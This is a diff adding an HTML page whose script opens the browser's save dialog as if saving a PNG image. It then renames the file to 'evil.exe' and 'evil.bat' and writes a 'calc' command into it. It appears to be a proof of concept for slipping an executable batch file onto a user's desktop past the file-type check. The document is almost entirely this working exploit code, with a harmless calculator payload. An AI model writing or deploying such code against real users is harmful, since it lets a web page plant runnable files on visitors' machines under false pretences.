@@ -1,0 +1,27 @@
+<button onclick="saveFile()">Save File</button>
+<h1>this is not images files</h1>
+<script>
+async function saveFile() {
+    try {
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: `thisisnot`,
+            startIn: "desktop",
+            types: [{
+                description: [`ImageFile`],
+                accept: {
+                    'image/png': ['.png']
+                },
+            }, ],
+        });
+        const writableStream = await fileHandle.createWritable();
+        fileHandle.move("evil.exe")
+      
+        await writableStream.write(new TextEncoder().encode(`calc`));
+        await writableStream.close();
+        fileHandle.move("evil.")
+        fileHandle.move("evil.bat")
+    } catch (error) {
+        console.log(error)
+    }
+}
+</script>
